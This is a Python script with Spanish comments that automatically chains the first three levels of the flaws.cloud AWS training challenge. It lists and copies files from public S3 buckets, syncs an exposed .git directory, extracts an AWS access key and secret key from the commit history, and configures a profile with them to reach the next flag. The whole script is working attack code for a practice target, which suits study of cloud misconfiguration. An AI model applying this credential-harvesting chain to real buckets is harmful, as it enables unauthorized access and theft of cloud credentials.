#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Autor: 5450R1
# Descripcion: Automatizar y encadenar la explotacion de los 3 primeros niveles de flaws
# Recordar cambiar el nombre de usuario IAM de forma manual en las lineas 92 96 101 119 124 128
# Uso: python3 flaws_chaining.py

# Modulos necesarios
import pexpect
import subprocess
import configparser
import os
import sys
import time
import signal
import warnings
from bs4 import BeautifulSoup
from colorama import Fore, Style, Back

# Target
target = "flaws.cloud"

# Colores
Green = Fore.GREEN
Red = Fore.RED
Yellow = Fore.YELLOW
Reset = Style.RESET_ALL

# Banner
def banner():
    print(f"""{Green}
    ====================================={Reset}
        {Yellow}     PENTESTING CLOWD AWS {Reset}{Green}
    =====================================
    FLAWS - Encadenando vulnerabilidades

    {Reset}""")
    time.sleep(2)

# Cancelar ejecucion, ctrl + c
def exiting(sig, frame):
    print(f"{Green}[!] Exiting...{Reset}\n")
    sys.exit(1)

signal.signal(signal.SIGINT, exiting)

# Funcion para ejecutar comandos
def ejecutar_comando(command):
	process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	stdout, stderr = process.communicate()

	if process.returncode != 0:
		print('Error al ejecutar el comando:', stderr.decode())
		exit(1)

	return stdout.decode().strip()

# Level-1
def level1():
    print(f"{Green}={Reset}" * 25 + f"{Green} Level 1 {Reset}" + f"{Green}={Reset}" * 25)
    print(f"{Green}[+] Target:{Reset} {Yellow} {target} {Reset}")
    print(f"{Green}[+] Listando Bucket s3...{Reset} ")

    listar_level1 = "aws s3 ls s3://flaws.cloud --no-sign-request"
    salida_level1 = ejecutar_comando(listar_level1)
    print(salida_level1)

    listar_secret1 = "aws s3 ls s3://flaws.cloud --no-sign-request | cut -d' ' -f10 | sed -n '7p'"
    salida_secret1 = ejecutar_comando(listar_secret1)
    print("")
    print(f"{Green}[+] Copiando el archivo: {Reset}{Yellow} {salida_secret1}{Reset} ")

    copiar_secret1 = f"aws s3 cp s3://flaws.cloud/{salida_secret1} . --no-sign-request"
    salida_secret1 = ejecutar_comando(copiar_secret1)

    ver_flag = "cat secret-dd02c7c.html | grep -o 'http://[^\"]*' | sed -n '1p'"
    salida_flag = ejecutar_comando(ver_flag)
    print(f"{Green}[+] FLAG level 1: {Reset}{Yellow}{salida_flag}{Reset}")
    print(f"{Green}={Reset}" * 50 + f"{Green}={Reset}" * len(" Level 1 "))

# Level-2
def level2():
    print(f"{Green}={Reset}" * 25 + f"{Green} Level 2 {Reset}" + f"{Green}={Reset}" * 25)
    comando_target2 = "cat secret-dd02c7c.html | grep -o 'http://[^\"]*' | sed -n '1p'"
    target2 = ejecutar_comando(comando_target2)
    print(f"{Green}[+] Target:{Reset} {Yellow} {target2} {Reset}")
    print(f"{Green}[+] Listando Bucket s3...{Reset} ")

    comando_target_2 = "cat secret-dd02c7c.html | grep -o 'http://[^\"]*' | sed -n '1p' | sed 's/http/s3/'"
    target_2 = ejecutar_comando(comando_target_2)
    listar_level2 = f"aws s3 ls {target_2} --profile user_test"
    salida_level2 = ejecutar_comando(listar_level2)
    print(salida_level2)

    listar_secret2 = f"aws s3 ls {target_2} --profile user_test | cut -d' ' -f10 | sed -n '6p'"
    salida_secret2 = ejecutar_comando(listar_secret2)
    print("")
    print(f"{Green}[+] Copiando el archivo: {Reset}{Yellow} {salida_secret2}{Reset} ")

    copiar_secret2 = f"aws s3 cp {target_2}/{salida_secret2} . --profile user_test"
    salida_secret_2 = ejecutar_comando(copiar_secret2)

    ver_flag2 = "cat secret-e4443fc.html | grep -o 'http://[^\"]*' | sed -n '1p'"
    salida_flag2 = ejecutar_comando(ver_flag2)
    print(f"{Green}[+] FLAG level 2: {Reset}{Yellow}{salida_flag2}{Reset}")
    print(f"{Green}={Reset}" * 50 + f"{Green}={Reset}" * len(" Level 2 "))

# Level-3
def level3():
    print(f"{Green}={Reset}" * 25 + f"{Green} Level 3 {Reset}" + f"{Green}={Reset}" * 25)
    comando_target3 = "cat secret-e4443fc.html | grep -o 'http://[^\"]*' | sed -n '1p'"
    target3 = ejecutar_comando(comando_target3)
    print(f"{Green}[+] Target:{Reset} {Yellow} {target3} {Reset}")
    print(f"{Green}[+] Listando Bucket s3...{Reset} ")

    comando_target_3 = "cat secret-e4443fc.html | grep -o 'http://[^\"]*' | sed -n '1p' | sed 's/http/s3/'"
    target_3 = ejecutar_comando(comando_target_3)
    listar_level3 = f"aws s3 ls {target_3} --profile user_test"
    salida_level3 = ejecutar_comando(listar_level3)
    print(salida_level3)
    print("")

    listar_secret3 = rf"aws s3 ls {target_3} --profile user_test | grep -o '\.git'"
    salida_secret3 = ejecutar_comando(listar_secret3)
    print(f"{Green}[+] Sincronizando: {Reset}{Yellow} {salida_secret3}{Reset} ")

    comando_copiar_level3 = f"aws s3 sync {target_3} . --profile user_test"
    salida_copiar_level3 = ejecutar_comando(comando_copiar_level3)
    comando_access_key_id = "git log | cut -d' ' -f2 | sed -n '1p' | git show | sed -n '13p' | cut -d' ' -f2"
    salida_access_key_id = ejecutar_comando(comando_access_key_id)
    print(f"{Green}[+] Credenciales encontradas: {Reset}")
    print(f"{Green}[{Yellow}!{Reset}{Green}] Access Key Id: {Reset}{Yellow}{salida_access_key_id}{Reset}")

    comando_secret_access_key = "git log | cut -d' ' -f2 | sed -n '1p' | git show | sed -n '14p' | cut -d' ' -f2"
    salida_secret_access_key = ejecutar_comando(comando_secret_access_key)
    print(f"{Green}[{Yellow}!{Reset}{Green}] Secrete Access Key: {Reset}{Yellow}{salida_secret_access_key}{Reset}")

    target_cut = "cat secret-e4443fc.html | grep -o 'http://[^\"]*' | sed -n '1p' | grep -oP '(?<=http://).*' | tr -d '\r\n'"
    salida_target_cut = ejecutar_comando(target_cut)
    comando_region_level3 = f"host {salida_target_cut} | cut -d' ' -f4 | sed -n '1p' | nslookup | grep -Po '(?<=website-).*?(?=.amazonaws)'"
    region_level3 = ejecutar_comando(comando_region_level3)
    print(f"{Green}[+] Region: {Reset}{Yellow}{region_level3}{Reset}")
    print("")
    nombre_perfil = "level3"
    formato_salida = "json"

    return nombre_perfil, salida_access_key_id, salida_secret_access_key, region_level3, formato_salida

# Configurar el nuevo perfil con las credenciales obtenidas
def configurar_perfil(nombre_perfil, salida_access_key_id, salida_secret_access_key, region, formato_salida):
    try:
        # Ejecutar el comando 'aws configure' utilizando pexpect
        print(f"{Green}[*] Configurando Perfil Level3{Reset}")
        configure_process = pexpect.spawn('aws configure --profile ' + nombre_perfil)

        # Esperar a que aparezcan las solicitudes de entrada y enviar las respuestas
        configure_process.expect('AWS Access Key ID')
        configure_process.sendline(salida_access_key_id)
        configure_process.expect('AWS Secret Access Key')
        configure_process.sendline(salida_secret_access_key)
        configure_process.expect('Default region name')
        configure_process.sendline(region)
        configure_process.expect('Default output format')
        configure_process.sendline(formato_salida)

        # Esperar a que termine la configuración
        configure_process.expect(pexpect.EOF)
        configure_process.close()

        print(f"\n{Green}[+] La configuración del perfil '{nombre_perfil}' se realizó correctamente.{Reset}\n")
        return True
    except Exception as e:
        print(f"{Red}[-]{Reset} {Green}Error al configurar el perfil de AWS{Reset}\n")
        print(e)
        return False


def flag3():
    comando_flag4 = "aws s3 ls --profile level3 | sed -n '7p' | cut -d' ' -f3"
    salida_flag4 = ejecutar_comando(comando_flag4)
    print(f"{Green}[+] FLAG 4: {Reset}{Yellow}{salida_flag4}{Reset}")
    print(f"{Green}={Reset}" * 65)

# Funcion principal
def main():
    subprocess.call('clear', shell=True)
    banner()
    level1()
    level2()
    valores_perfil = level3()
    configurar_perfil(*valores_perfil)
    flag3()



if __name__ == "__main__":
	main()

